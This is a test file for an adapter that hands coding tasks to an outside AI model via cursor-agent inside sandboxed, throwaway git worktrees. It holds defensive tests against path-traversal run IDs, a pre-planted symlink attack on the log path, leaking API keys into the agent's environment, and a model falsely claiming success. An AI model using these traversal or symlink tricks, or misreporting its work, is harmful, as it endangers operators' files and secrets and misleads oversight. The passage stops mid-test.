/**
 * foreign-dispatch.test.mjs — the Cursor-channel foreign-model adapter (#1150).
 *
 * Every case below names the bug it catches. The real `cursor-agent` binary is
 * never spawned (spawnFn seam) and the only git worktree created is inside a
 * synthetic mkdtemp repo — never this working copy.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import {
  dispatchForeign,
  isForeignWorktreePath,
  parseCursorStream,
  removeForeignWorktree,
  FOREIGN_AGENT_BASE_ARGS,
  FOREIGN_ENV_ALLOWLIST,
  MEASUREMENT_EXCLUDES,
} from '@lib/wave-executor/foreign-dispatch.mjs';
import {
  isNeverForeignRole,
  NEVER_FOREIGN_ROLES,
  DEFAULT_TIMEOUT_SEC,
} from '@lib/wave-executor/dispatch-common.mjs';

const NUL = String.fromCharCode(0);

/**
 * A fake child process: emits the given capture on stdout/stderr, then closes.
 *
 * - `hang: true` never closes on its own — only when killed — which is how the
 *   timeout path is exercised without waiting for a real clock.
 * - `ignoreSigterm: true` models the child this module's escalation exists for:
 *   SIGTERM is a REQUEST, and a child that declines it closes only on SIGKILL.
 *   It implies `hang` — a child that ignores SIGTERM but exits on its own is
 *   not the shape the escalation is for, and silently exercises nothing.
 * - `errorCode` models a spawn that never produces a process at all (ENOENT =
 *   the `cursor-agent` binary is not installed).
 */
function fakeSpawn({
  stdout = '',
  stderr = '',
  exitCode = 0,
  hang = false,
  ignoreSigterm = false,
  errorCode = null,
} = {}) {
  const calls = [];
  const fn = (cmd, args, options) => {
    calls.push({ cmd, args, options });
    const child = new EventEmitter();
    child.stdout = new PassThrough();
    child.stderr = new PassThrough();
    child.killSignals = [];
    child.kill = (signal) => {
      child.killSignals.push(signal);
      if (ignoreSigterm && signal === 'SIGTERM') return true; // uncooperative child
      setImmediate(() => child.emit('close', ignoreSigterm ? null : 143, signal));
      return true;
    };
    setImmediate(() => {
      if (errorCode) {
        const err = new Error(`spawn ${cmd} ${errorCode}`);
        err.code = errorCode;
        child.emit('error', err);
        return;
      }
      if (stdout) child.stdout.write(stdout);
      if (stderr) child.stderr.write(stderr);
      if (!hang && !ignoreSigterm) setImmediate(() => child.emit('close', exitCode, null));
    });
    fn.lastChild = child;
    return child;
  };
  fn.calls = calls;
  return fn;
}

/**
 * A fake `execFileSync` for git: records every invocation and answers `diff`
 * queries from the supplied table. Everything else returns ''.
 */
function fakeExec({ nameOnly = '', diff = '', diffStat = '', untracked = '' } = {}) {
  const calls = [];
  const fn = (cmd, args) => {
    const joined = args.join(' ');
    calls.push(joined);
    if (joined.includes('ls-files')) return untracked;
    if (joined.includes('diff --stat')) return diffStat;
    if (joined.includes('diff --name-only')) return nameOnly;
    if (joined.endsWith('diff')) return diff;
    return '';
  };
  fn.calls = calls;
  return fn;
}

const noopEmit = async () => {};

// ---------------------------------------------------------------------------
// never_foreign gate
// ---------------------------------------------------------------------------

describe('never_foreign role lock', () => {
  // Bug: dispatch-cursor.sh does NOT read routing.yaml's never_foreign list, so
  // without this gate a security-review or migration role silently runs on a
  // foreign model. This adapter is the only enforcement point.
  it.each(NEVER_FOREIGN_ROLES)('rejects the locked role %s', async (role) => {
    const spawnFn = fakeSpawn();
    const execFn = fakeExec();
    const res = await dispatchForeign(
      { model: 'composer-2.5', prompt: 'p', repoRoot: '/nope', role, runId: 'r1' },
      { spawnFn, execFn, emitFn: noopEmit }
    );
    expect(res.ok).toBe(false);
    expect(res.reason).toBe('never-foreign-role');
  });

  // Bug: rejecting AFTER creating the worktree or spawning the child would
  // still send the prompt to the foreign model — the refusal must precede
  // every side effect, not merely change the return value.
  it('performs no spawn and no git call for a locked role', async () => {
    const spawnFn = fakeSpawn();
    const execFn = fakeExec();
    await dispatchForeign(
      { model: 'composer-2.5', prompt: 'secret', repoRoot: '/nope', role: 'secrets', runId: 'r2' },
      { spawnFn, execFn, emitFn: noopEmit }
    );
    expect(spawnFn.calls).toHaveLength(0);
    expect(execFn.calls).toHaveLength(0);
  });

  // Bug: `docs/events-schema.md` promises this event is "Emitted on refusals
  // too", but the early return emitted NOTHING — so a role lock that fired left
  // exactly the same ledger trace as a dispatch that was never attempted, and
  // the one signal saying the gate WORKS was unobservable (HR-105).
  it('emits a completion event for a refused role, with exit_code present', async () => {
    const events = [];
    const res = await dispatchForeign(
      { model: 'composer-2.5', prompt: 'p', repoRoot: '/nope', role: 'migration', runId: 'r3' },
      {
        spawnFn: fakeSpawn(),
        execFn: fakeExec(),
        emitFn: async (type, payload, opts) => events.push({ type, payload, opts }),
      }
    );
    expect(res.reason).toBe('never-foreign-role');
    expect(events).toHaveLength(1);
    expect(events[0].type).toBe('orchestrator.foreign_dispatch.completed');
    expect(events[0].opts).toEqual({ repoRoot: '/nope' });
    // exit_code PRESENT-and-null, not omitted: "refused" and "not attempted"
    // must stay distinguishable in the ledger.
    expect(events[0].payload).toMatchObject({
      ok: false,
      reason: 'never-foreign-role',
      role: 'migration',
      model: 'composer-2.5',
      exit_code: null,
      changed_files: 0,
    });
    expect('exit_code' in events[0].payload).toBe(true);
  });

  // NOT a routing.yaml parity guard: the expectation below is a literal in the
  // same file as the list it checks, so a drifted routing.yaml passes it. It
  // pins the list against an accidental in-repo edit and nothing more — the
  // cross-repo parity gap is named in the module header.
  it('pins the never_foreign list (routing.yaml parity is unguarded — see module header)', () => {
    expect([...NEVER_FOREIGN_ROLES]).toEqual([
      'impl-core',
      'security-review',
      'migration',
      'release',
      'secrets',
      'incident',
      'refactor-crosscut',
    ]);
  });

  it.each([
    { role: 'impl-polish', locked: false },
    { role: 'review-readonly', locked: false },
    { role: '  migration  ', locked: true },
    { role: undefined, locked: false },
  ])('isNeverForeignRole($role) === $locked', ({ role, locked }) => {
    expect(isNeverForeignRole(role)).toBe(locked);
  });

  // Bug: a lowered default timeout reads as model failure — measured, grok ran
  // 2 of 3 hard tasks past a 540 s cap. 900 is a floor, pinned here.
  it('keeps the 900s default timeout floor', () => {
    expect(DEFAULT_TIMEOUT_SEC).toBeGreaterThanOrEqual(900);
  });
});

// ---------------------------------------------------------------------------
// stream parsing
// ---------------------------------------------------------------------------

describe('parseCursorStream', () => {
  const capture = [
    '{"type":"system","subtype":"init"}',
    `{"type":"assistant","message":{"content":[{"type":"text","text":"looking${NUL} around"}]},"readToolCall":{"path":"a.mjs"}}`,
    'warning: something on stderr, not JSON at all',
    '{"type":"assistant","grepToolCall":{"pattern":"x"}}',
    '{"type":"assistant","editToolCall":{},"shellToolCall":{}}',
    '{"type":"assistant","futureUnknownToolCall":{}}',
    '42',
    '{"type":"result","result":"done: 2 files changed"}',
  ].join('\n');

  // Bug: stderr is 2>&1-merged into the stream and the format carries literal
  // NUL bytes — a strict JSON.parse over the whole capture throws and loses
  // every event, so a successful run is reported as a parse failure.
  it('skips non-JSON lines instead of throwing', () => {
    const out = parseCursorStream(capture);
    expect(out.skippedLines).toBe(2); // the warning line and the bare `42`
    expect(out.parsedLines).toBe(6);
  });

  it('strips NUL bytes out of assistant text', () => {
    const out = parseCursorStream(capture);
    expect(out.resultText).toBe('done: 2 files changed');
    expect(parseCursorStream(`{"type":"result","result":"a${NUL}b"}`).resultText).toBe('ab');
  });

  // Bug: pinning the tool vocabulary to a known list silently counts every tool
  // a future cursor-agent release adds as zero, so a busy run looks idle.
  it('counts any *ToolCall key, including an unknown one', () => {
    const out = parseCursorStream(capture);
    expect(out.toolCounts).toEqual({
      readToolCall: 1,
      grepToolCall: 1,
      editToolCall: 1,
      shellToolCall: 1,
      futureUnknownToolCall: 1,
    });
    expect(out.toolCallTotal).toBe(5);
  });

  it.each([
    { why: 'empty capture', raw: '' },
    { why: 'null', raw: null },
    { why: 'only blank lines', raw: '\n\n   \n' },
  ])('returns an empty envelope for $why', ({ raw }) => {
    const out = parseCursorStream(raw);
    expect(out.toolCallTotal).toBe(0);
    expect(out.resultText).toBe('');
  });
});

// ---------------------------------------------------------------------------
// dispatch outcome classification
// ---------------------------------------------------------------------------

describe('dispatchForeign outcome classification', () => {
  let tmpRoot;
  let wtParent;
  beforeAll(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'so-fd-out-'));
    // The worktree parent is a SIBLING of the repo root, never a child: a
    // worktreeRoot inside repoRoot is refused outright (unsafe-worktree-root).
    wtParent = fs.mkdtempSync(path.join(os.tmpdir(), 'so-foreign-out-'));
  });
  afterAll(() => {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
    fs.rmSync(wtParent, { recursive: true, force: true });
  });

  const dispatch = (overrides = {}, deps = {}) =>
    dispatchForeign(
      {
        model: 'composer-2.5',
        prompt: 'do the thing',
        repoRoot: tmpRoot,
        role: 'impl-polish',
        runId: overrides.runId || `run-${Math.random().toString(36).slice(2)}`,
        worktreeRoot: path.join(wtParent, overrides.runId || 'wt-default'),
        ...overrides,
      },
      { emitFn: noopEmit, ...deps }
    );

  // Bug (the load-bearing one): the model reports "implemented X, all tests
  // pass" while having written nothing. Trusting the prose marks an empty run
  // as success. The filesystem is the only verdict.
  it('reports not-ok with reason empty-diff when nothing changed', async () => {
    const res = await dispatch(
      { runId: 'empty' },
      {
        spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"I implemented everything."}' }),
        execFn: fakeExec({ nameOnly: '', diff: '', diffStat: '' }),
      }
    );
    expect(res.ok).toBe(false);
    expect(res.reason).toBe('empty-diff');
    expect(res.resultText).toBe('I implemented everything.');
    expect(res.changedFiles).toEqual([]);
  });

  // Bug: `git diff` sees tracked files only. A run whose entire output is NEW
  // files (the common shape for an impl agent) would be classified as
  // `empty-diff` and thrown away as a failure.
  it('counts newly created untracked files as changed', async () => {
    const res = await dispatch(
      { runId: 'newfiles' },
      {
        spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"created 2 files"}' }),
        execFn: fakeExec({ nameOnly: '', diff: '', untracked: 'new-a.mjs\nnew-b.mjs\n' }),
      }
    );
    expect(res.ok).toBe(true);
    expect(res.newFiles).toEqual(['new-a.mjs', 'new-b.mjs']);
    expect(res.modifiedFiles).toEqual([]);
    expect(res.changedFiles).toEqual(['new-a.mjs', 'new-b.mjs']);
  });

  it('excludes node_modules from the untracked enumeration query', async () => {
    const execFn = fakeExec({ nameOnly: 'a.mjs\n' });
    await dispatch({ runId: 'excl' }, { spawnFn: fakeSpawn(), execFn });
    const lsCall = execFn.calls.find((c) => c.includes('ls-files'));
    expect(lsCall).toBeDefined();
    expect(lsCall).toContain('--exclude-standard');
    for (const p of MEASUREMENT_EXCLUDES) expect(lsCall).toContain(`--exclude=${p}`);
    // No exclude FILE is written anywhere — the shared .git/info/exclude of the
    // operator's repo is not ours to mutate (PSA-003). (`rev-parse` IS called,
    // read-only, for the hooks fingerprint — so the assertion names the write
    // it forbids rather than a command that no longer implies one.)
    expect(execFn.calls.some((c) => c.includes('info/exclude'))).toBe(false);
  });

  it('reports ok with the measured file list when the diff is non-empty', async () => {
    const res = await dispatch(
      { runId: 'nonempty' },
      {
        spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"done"}' }),
        execFn: fakeExec({
          nameOnly: 'a.mjs\nb.mjs\n',
          diff: 'diff --git a/a.mjs b/a.mjs\n+x\n',
          diffStat: ' 2 files changed, 4 insertions(+)',
        }),
      }
    );
    expect(res.ok).toBe(true);
    expect(res.reason).toBeUndefined();
    expect(res.changedFiles).toEqual(['a.mjs', 'b.mjs']);
    expect(res.diffStat).toBe('2 files changed, 4 insertions(+)');
  });

  // Bug: a SIGTERM'd run exits 143 with a partial diff. Classifying it as a
  // plain non-zero exit hides that the model was cut off mid-task, which is the
  // difference between "model failed" and "budget too small".
  it('classifies a killed run as timedOut', async () => {
    const res = await dispatch(
      { runId: 'timeout', timeoutSec: 0.01 },
      {
        spawnFn: fakeSpawn({ stdout: '{"type":"assistant","readToolCall":{}}', hang: true }),
        execFn: fakeExec({ nameOnly: 'a.mjs\n' }),
      }
    );
    expect(res.timedOut).toBe(true);
    expect(res.reason).toBe('timeout');
    expect(res.ok).toBe(false);
    expect(res.exitCode).toBe(143);
  });

  it('reports exit-nonzero for a failing child that still wrote files', async () => {
    const res = await dispatch(
      { runId: 'failed' },
      { spawnFn: fakeSpawn({ exitCode: 1 }), execFn: fakeExec({ nameOnly: 'a.mjs\n' }) }
    );
    expect(res.ok).toBe(false);
    expect(res.reason).toBe('exit-nonzero');
    expect(res.timedOut).toBe(false);
  });

  // Bug: dispatch-cursor.sh trap-deletes its mktemp log and surfaces only the
  // last 20 lines, so the supervising reviewer cannot read what the model did.
  // The log must survive the call, and must live OUTSIDE the worktree or it
  // would show up in the diff we measure.
  it('keeps the full stream log outside the worktree', async () => {
    const res = await dispatch(
      { runId: 'logged' },
      {
        spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"ok"}\n', stderr: 'noise\n' }),
        execFn: fakeExec({ nameOnly: 'a.mjs\n' }),
      }
    );
    expect(fs.existsSync(res.logPath)).toBe(true);
    const log = fs.readFileSync(res.logPath, 'utf8');
    expect(log).toContain('"result":"ok"');
    expect(log).toContain('noise');
    expect(res.logPath.startsWith(res.worktreePath + path.sep)).toBe(false);
  });

  // Bug: SubagentStop telemetry cannot fire for a Bash child, so without this
  // event a foreign dispatch leaves no ledger trace at all — and an event
  // written without an explicit repoRoot lands in whatever SO_PROJECT_DIR
  // happens to be, i.e. a foreign repo's ledger.
  it('emits one completion event with an explicit repoRoot', async () => {
    const events = [];
    await dispatch(
      { runId: 'evented' },
      {
        spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"ok"}' }),
        execFn: fakeExec({ nameOnly: 'a.mjs\nb.mjs\n' }),
        emitFn: async (type, payload, opts) => events.push({ type, payload, opts }),
      }
    );
    expect(events).toHaveLength(1);
    expect(events[0].type).toBe('orchestrator.foreign_dispatch.completed');
    expect(events[0].opts).toEqual({ repoRoot: tmpRoot });
    expect(events[0].payload).toMatchObject({
      model: 'composer-2.5',
      role: 'impl-polish',
      ok: true,
      exit_code: 0,
      timed_out: false,
      changed_files: 2,
    });
  });

  it('spawns cursor-agent with stream-json in the worktree, never the repo root', async () => {
    const spawnFn = fakeSpawn({ stdout: '{"type":"result","result":"ok"}' });
    const res = await dispatch(
      { runId: 'argv' },
      { spawnFn, execFn: fakeExec({ nameOnly: 'a.mjs\n' }) }
    );
    expect(spawnFn.calls).toHaveLength(1);
    const call = spawnFn.calls[0];
    expect(call.cmd).toBe('cursor-agent');
    expect(call.args).toEqual([
      '--print',
      '--force',
      '--sandbox',
      'enabled',
      '--model',
      'composer-2.5',
      '--output-format',
      'stream-json',
      'do the thing',
    ]);
    expect(call.options.cwd).toBe(res.worktreePath);
    expect(call.options.cwd).not.toBe(tmpRoot);
  });

  // Bug (HIGH): `--force` is cursor-agent's yolo mode. Without `--sandbox
  // enabled` beside it, an auto-approved shell call is unconfined — and the
  // worktree is not a boundary, since core.hooksPath resolves to the operator's
  // REAL repo from inside it (measured 2026-08-25: `<repo>/.husky/_`).
  it('confines the foreign agent with --sandbox enabled', async () => {
    const spawnFn = fakeSpawn({ stdout: '{"type":"result","result":"ok"}' });
    await dispatch({ runId: 'sandboxed' }, { spawnFn, execFn: fakeExec({ nameOnly: 'a.mjs\n' }) });
    const { args } = spawnFn.calls[0];
    expect(args.slice(0, FOREIGN_AGENT_BASE_ARGS.length)).toEqual([...FOREIGN_AGENT_BASE_ARGS]);
    expect(args[args.indexOf('--sandbox') + 1]).toBe('enabled');
  });

  // Bug (HIGH): spawning with no `env` key inherits the coordinator's entire
  // environment — CLANK_EVENT_SECRET, host PATs, every API key — into a foreign
  // model that has shell access. The allowlist makes that structural, not
  // careful: a secret that is not on the list cannot be handed over.
  it('hands the child an allowlisted env, never the inherited one', async () => {
    const spawnFn = fakeSpawn({ stdout: '{"type":"result","result":"ok"}' });
    await dispatch(
      { runId: 'env' },
      {
        spawnFn,
        execFn: fakeExec({ nameOnly: 'a.mjs\n' }),
        envSource: {
          PATH: '/usr/bin',
          HOME: '/home/x',
          CURSOR_API_KEY: 'cursor-key',
          CLANK_EVENT_SECRET: 'super-secret',
          GITLAB_TOKEN: 'glpat-should-never-travel',
          ANTHROPIC_API_KEY: 'sk-ant-nope',
        },
      }
    );
    const { env } = spawnFn.calls[0].options;
    expect(env).toEqual({ PATH: '/usr/bin', HOME: '/home/x', CURSOR_API_KEY: 'cursor-key' });
    for (const leaked of ['CLANK_EVENT_SECRET', 'GITLAB_TOKEN', 'ANTHROPIC_API_KEY']) {
      expect(leaked in env).toBe(false);
      expect(FOREIGN_ENV_ALLOWLIST).not.toContain(leaked);
    }
  });

  // Bug (HIGH, hang): SIGTERM is a REQUEST. runChild resolves only on `close`
  // or `error`, so a child that installs a SIGTERM handler and declines to exit
  // hangs dispatchForeign — and the whole wave — forever. SIGKILL is not
  // catchable, so the escalation always terminates.
  it('escalates SIGTERM to SIGKILL for a child that ignores the first signal', async () => {
    const spawnFn = fakeSpawn({ stdout: '{"type":"assistant","readToolCall":{}}', ignoreSigterm: true });
    const res = await dispatch(
      { runId: 'sigkill', timeoutSec: 0.01 },
      { spawnFn, execFn: fakeExec({ nameOnly: 'a.mjs\n' }), killGraceMs: 5 }
    );
    expect(res.killSignals).toEqual(['SIGTERM', 'SIGKILL']);
    expect(spawnFn.lastChild.killSignals).toEqual(['SIGTERM', 'SIGKILL']);
    expect(res.timedOut).toBe(true);
    expect(res.reason).toBe('timeout');
  });

  // Bug (LOW, temp-path): the log is opened at a predictable path in a shared
  // temp root. Without `wx`, a pre-planted symlink there is FOLLOWED — the
  // capture (which carries the whole prompt and the model's stream) is written
  // into whatever the attacker pointed at, and the dispatch reports success.
  it('refuses to follow a pre-planted symlink at the log path', async () => {
    const target = path.join(wtParent, 'symlink-target.txt');
    fs.writeFileSync(target, 'original\n');
    fs.symlinkSync(target, path.join(wtParent, 'symlinked.log.jsonl'));

    const res = await dispatch(
      { runId: 'symlinked' },
      {
        spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"secret prompt echo"}' }),
        execFn: fakeExec({ nameOnly: 'a.mjs\n' }),
      }
    );
    expect(fs.readFileSync(target, 'utf8')).toBe('original\n');
    // The path is NULLED rather than left pointing at a log that was not
    // written — a reviewer must not be sent to a file that is not the capture.
    expect(res.logPath).toBe(null);
    expect(typeof res.logError).toBe('string');
  });

  it('records no kill signal for a child that exits on its own', async () => {
    const res = await dispatch(
      { runId: 'nokill' },
      { spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"ok"}' }), execFn: fakeExec({ nameOnly: 'a.mjs\n' }) }
    );
    expect(res.killSignals).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// path safety — the arguments that reach `git worktree add/remove --force`
// ---------------------------------------------------------------------------

describe('dispatchForeign path guards', () => {
  let repoRoot;
  beforeAll(() => {
    repoRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'so-fd-guard-'));
  });
  afterAll(() => {
    fs.rmSync(repoRoot, { recursive: true, force: true });
  });

  // Bug: runId names a directory AND a log file before it names a run, so it is
  // a path segment. `../../x` places the worktree — and the `--force` removal
  // that eventually follows it — anywhere the process can write.
  it.each(['../escape', 'a/b', '..', '.', 'has space', ''])(
    'refuses runId %j without touching git',
    async (runId) => {
      const execFn = fakeExec();
      const spawnFn = fakeSpawn();
      const res = await dispatchForeign(
        { model: 'composer-2.5', prompt: 'p', repoRoot, role: 'impl-polish', runId },
        { spawnFn, execFn, emitFn: noopEmit }
      );
      expect(res.ok).toBe(false);
      expect(res.reason).toBe('unsafe-run-id');
      expect(execFn.calls).toHaveLength(0);
      expect(spawnFn.calls).toHaveLength(0);
    }
  );

  // Bug: a worktree created INSIDE the repo lands in the tree the coordinator
  // commits from and is read by this repo's own worktree scanners — the exact
  // thing the "detached, throwaway" design exists to avoid.
  it.each([
    ['inside repoRoot', (r) => path.join(r, 'nested', 'wt')],
    ['equal to repoRoot', (r) => r],
  ])('refuses a worktreeRoot %s without touching git', async (_why, build) => {
    const execFn = fakeExec();
    const spawnFn = fakeSpawn();
    const res = await dispatchForeign(
      {
        model: 'composer-2.5',
        prompt: 'p',
        repoRoot,
        role: 'impl-polish',
        runId: 'ok-id',
        worktreeRoot: build(repoRoot),
      },
      { spawnFn, execFn, emitFn: noopEmit }
    );
    expect(res.ok).toBe(false);
    expect(res.reason).toBe('unsafe-worktree-root');
    expect(execFn.calls).toHaveLength(0);
    expect(spawnFn.calls).toHaveLength(0);
  });

  it.each([
    { why: 'outside tmpdir', p: '/etc', want: false },
    { why: 'the tmp root itself', p: os.tmpdir(), want: false },
    { why: 'a foreign-prefixed mkdtemp parent', p: path.join(os.tmpdir(), 'so-foreign-a1b2', 'run'), want: true },
    { why: 'the fixed legacy parent', p: path.join(os.tmpdir(), 'so-foreign', 'run'), want: true },
    { why: 'another tmp directory', p: path.join(os.tmpdir(), 'somethingelse', 'run'), want: false },
    { why: 'a traversal back out of tmp', p: path.join(os.tmpdir(), 'so-foreign', '..', '..', 'etc'), want: false },
    { why: 'a non-string', p: null, want: false },
  ])('isForeignWorktreePath($why) === $want', ({ p, want }) => {
    expect(isForeignWorktreePath(p)).toBe(want);
  });
});

// ---------------------------------------------------------------------------
// worktree mechanics against a synthetic git repo (never this working copy)
// ---------------------------------------------------------------------------

describe('worktree mechanics (synthetic repo)', () => {
  let fixture;
  let worktree;

  beforeAll(() => {
    fixture = fs.mkdtempSync(path.join(os.tmpdir(), 'so-fd-git-'));
    const git = (...args) =>
      execFileSync('git', ['-C', fixture, ...args], { encoding: 'utf8', stdio: 'pipe' });
    execFileSync('git', ['init', '-q', '-b', 'main', fixture], { encoding: 'utf8' });
    git('config', 'user.email', 'test@example.invalid');
    git('config', 'user.name', 'Fixture');
    fs.writeFileSync(path.join(fixture, 'seed.txt'), 'seed\n');
    git('add', 'seed.txt');
    git('commit', '-q', '-m', 'seed');
    worktree = path.join(fixture, '..', `${path.basename(fixture)}-wt`);
    git('worktree', 'add', '--detach', '-q', worktree, 'HEAD');
  });

  afterAll(() => {
    // Removed with git directly, NOT via removeForeignWorktree: this fixture
    // worktree deliberately lives outside <tmpdir>/so-foreign*, which is
    // exactly the shape that function now refuses.
    try {
      execFileSync('git', ['-C', fixture, 'worktree', 'remove', '--force', worktree], {
        encoding: 'utf8',
        stdio: 'pipe',
      });
    } catch {
      /* best effort */
    }
    fs.rmSync(fixture, { recursive: true, force: true });
    fs.rmSync(worktree, { recursive: true, force: true });
  });

  // Bug (measured 2026-08-25, refutes the "append to <wt>/.git/info/exclude"
  // design): in a LINKED worktree `<wt>/.git` is a FILE, and the gitdir it
  // points at is a PER-WORKTREE directory whose `info/exclude` git never reads.
  // Writing the exclusion there is a silent no-op that looks like protection;
  // the file git actually reads is the SHARED `--git-common-dir/info/exclude`
  // of the operator's real repo, which a throwaway run must not mutate.
  // Hence: query-time `--exclude`, and this test pins WHY.
  it('proves a per-worktree info/exclude is not honoured by git', () => {
    expect(fs.statSync(path.join(worktree, '.git')).isFile()).toBe(true);
    const perWorktreeGitDir = execFileSync(
      'git',
      ['-C', worktree, 'rev-parse', '--git-dir'],
      { encoding: 'utf8' }
    ).trim();
    const commonGitDir = execFileSync(
      'git',
      ['-C', worktree, 'rev-parse', '--git-common-dir'],
      { encoding: 'utf8' }
    ).trim();
    expect(path.resolve(worktree, perWorktreeGitDir)).not.toBe(path.resolve(worktree, commonGitDir));

    fs.mkdirSync(path.join(perWorktreeGitDir, 'info'), { recursive: true });
    fs.writeFileSync(path.join(perWorktreeGitDir, 'info', 'exclude'), 'node_modules\n');
    fs.mkdirSync(path.join(worktree, 'node_modules'), { recursive: true });
    fs.writeFileSync(path.join(worktree, 'node_modules', 'x.js'), 'x\n');

    const status = execFileSync('git', ['-C', worktree, 'status', '--porcelain'], {
      encoding: 'utf8',
    });
    expect(status).toContain('node_modules');
  });

  // Bug: without the query-time exclusion, one `npm install` inside the
  // worktree buries the model's actual edits under thousands of paths — and
  // `changed_files` in the telemetry event becomes meaningless.
  it('excludes node_modules at query time without writing any exclude file', () => {
    fs.mkdirSync(path.join(worktree, 'node_modules'), { recursive: true });
    fs.writeFileSync(path.join(worktree, 'node_modules', 'x.js'), 'x\n');
    fs.writeFileSync(path.join(worktree, 'brand-new.mjs'), 'export const x = 1;\n');

    const listed = execFileSync(
      'git',
      [
        '-C',
        worktree,
        'ls-files',
        '--others',
        '--exclude-standard',
        ...MEASUREMENT_EXCLUDES.map((p) => `--exclude=${p}`),
      ],
      { encoding: 'utf8' }
    );
    expect(listed).toContain('brand-new.mjs');
    expect(listed).not.toContain('node_modules');
  });

  // Bug (measured): `git diff` is blind to a file the model CREATES, and a
  // foreign impl agent's output is frequently a new file. A diff-only
  // measurement therefore reports a successful run as `empty-diff`.
  it('proves git diff alone cannot see a newly created file', () => {
    fs.writeFileSync(path.join(worktree, 'created-by-model.mjs'), 'export const y = 2;\n');
    const diffOnly = execFileSync('git', ['-C', worktree, 'diff', '--name-only'], {
      encoding: 'utf8',
    });
    expect(diffOnly.trim()).toBe('');
    const others = execFileSync(
      'git',
      ['-C', worktree, 'ls-files', '--others', '--exclude-standard', '--exclude=node_modules'],
      { encoding: 'utf8' }
    );
    expect(others).toContain('created-by-model.mjs');
  });

  it('removeForeignWorktree reports a structured failure instead of throwing', () => {
    // A foreign-SHAPED path (so it clears the safety guard and git is actually
    // called) that does not exist — this pins the git-failure path, not the
    // refusal path the test below covers.
    const absent = fs.mkdtempSync(path.join(os.tmpdir(), 'so-foreign-absent-'));
    try {
      const res = removeForeignWorktree({
        repoRoot: fixture,
        worktreePath: path.join(absent, 'does-not-exist'),
      });
      expect(res.ok).toBe(false);
      expect(res.reason).toBeUndefined();
      expect(typeof res.error).toBe('string');
    } finally {
      fs.rmSync(absent, { recursive: true, force: true });
    }
  });

  // Bug (HIGH): `git worktree remove --force` DELETES the directory including
  // uncommitted work. The path arrives through a result envelope and a
  // coordinator prompt; unguarded, a worktreePath that is not one of ours is a
  // request to destroy something nobody here created (PSA-003). The refusal
  // must precede the git call, not merely report afterwards.
  it('refuses to force-remove a worktree outside the foreign tmp root, making no git call', () => {
    const victim = path.join(fixture, '..', `${path.basename(fixture)}-victim`);
    execFileSync('git', ['-C', fixture, 'worktree', 'add', '--detach', '-q', victim, 'HEAD'], {
      encoding: 'utf8',
    });
    const dirty = path.join(victim, 'uncommitted-work.txt');
    fs.writeFileSync(dirty, 'work nobody else may delete\n');

    const calls = [];
    const execSpy = (cmd, args) => {
      calls.push([cmd, ...args].join(' '));
      return '';
    };

    try {
      const res = removeForeignWorktree(
        { repoRoot: fixture, worktreePath: victim },
        { execFn: execSpy }
      );
      expect(res.ok).toBe(false);
      expect(res.reason).toBe('unsafe-worktree-path');
      expect(calls).toEqual([]); // no git call at all, not even a failing one
      expect(fs.existsSync(dirty)).toBe(true);
      expect(fs.readFileSync(dirty, 'utf8')).toContain('work nobody else may delete');
    } finally {
      try {
        execFileSync('git', ['-C', fixture, 'worktree', 'remove', '--force', victim], {
          encoding: 'utf8',
          stdio: 'pipe',
        });
      } catch {
        /* best effort */
      }
      fs.rmSync(victim, { recursive: true, force: true });
    }
  });

  // Bug (MED): an ENOENT from spawn (cursor-agent not installed) classified as
  // `exit-nonzero` reads as "the model failed" and sends the coordinator
  // hunting the prompt instead of the channel — AND leaves the just-created
  // worktree registered in the operator's REAL repo, where nothing later
  // removes it.
  it('classifies a missing binary as channel-unavailable and leaves no orphaned worktree', async () => {
    const foreignParent = fs.mkdtempSync(path.join(os.tmpdir(), 'so-foreign-enoent-'));
    const listLines = () =>
      execFileSync('git', ['-C', fixture, 'worktree', 'list'], { encoding: 'utf8' })
        .split('\n')
        .filter(Boolean).length;
    const before = listLines();
    const events = [];

    try {
      const res = await dispatchForeign(
        {
          model: 'composer-2.5',
          prompt: 'p',
          repoRoot: fixture,
          role: 'impl-polish',
          runId: 'enoent-run',
          worktreeRoot: path.join(foreignParent, 'enoent-run'),
        },
        {
          spawnFn: fakeSpawn({ errorCode: 'ENOENT' }),
          emitFn: async (type, payload) => events.push({ type, payload }),
        }
      );
      expect(res.ok).toBe(false);
      expect(res.reason).toBe('channel-unavailable');
      expect(res.timedOut).toBe(false);
      expect(listLines()).toBe(before);
      expect(fs.existsSync(path.join(foreignParent, 'enoent-run'))).toBe(false);
      expect(events).toHaveLength(1);
      expect(events[0].payload).toMatchObject({ ok: false, reason: 'channel-unavailable' });
    } finally {
      fs.rmSync(foreignParent, { recursive: true, force: true });
    }
  });

  // Bug (LOW, temp-path): the default parent was a FIXED `<tmpdir>/so-foreign/`
  // — guessable, and pre-creatable by any other process on the host, which owns
  // its mode bits and can plant symlinks inside it before the run starts.
  // mkdtemp's random 0700 directory is not.
  it('defaults the worktree parent to a fresh mkdtemp directory, not a fixed path', async () => {
    const before = execFileSync('git', ['-C', fixture, 'worktree', 'list'], { encoding: 'utf8' })
      .split('\n')
      .filter(Boolean).length;
    const res = await dispatchForeign(
      { model: 'composer-2.5', prompt: 'p', repoRoot: fixture, role: 'impl-polish', runId: 'defaulted' },
      { spawnFn: fakeSpawn({ errorCode: 'ENOENT' }), emitFn: noopEmit }
    );
    expect(res.reason).toBe('channel-unavailable');
    // worktreePath is nulled on the channel-unavailable path, so the parent is
    // read off the log path — the one locator that survives.
    const parent = path.dirname(res.logPath ?? '');
    expect(isForeignWorktreePath(path.join(parent, 'defaulted'))).toBe(true);
    expect(parent).not.toBe(path.join(os.tmpdir(), 'so-foreign'));
    expect(path.basename(parent).length).toBeGreaterThan('so-foreign-'.length);
    expect(
      execFileSync('git', ['-C', fixture, 'worktree', 'list'], { encoding: 'utf8' })
        .split('\n')
        .filter(Boolean).length
    ).toBe(before);
